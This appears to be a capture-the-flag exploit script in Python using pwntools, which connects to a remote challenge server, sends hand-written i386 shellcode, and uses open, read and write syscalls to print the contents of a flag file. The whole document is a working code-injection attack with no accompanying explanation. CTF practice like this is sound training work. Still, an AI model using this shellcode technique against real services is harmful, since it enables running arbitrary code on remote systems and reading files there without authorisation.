#!/usr/bin/env python

from pwn import *
from pwnlib.log import *

context(os='linux', arch='i386')

r = remote('csie.ctf.tw', 6001)

r.recvuntil('Submit your shellcode here: ')

sh = (
    '''
    %s
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    push SYS_open
    pop eax
    int 0x80

    mov ebx, 3
    mov ecx, esp
    push 50
    pop edx
    push SYS_read
    pop eax
    int 0x80

    mov edx, eax
    mov ecx, esp
    push 1
    pop ebx
    push SYS_write
    pop eax
    int 0x80
    ''' %
    shellcraft.pushstr('/home/shellcode/flag')
    )
print disasm(asm(sh))
r.send(asm(sh))

r.interactive()
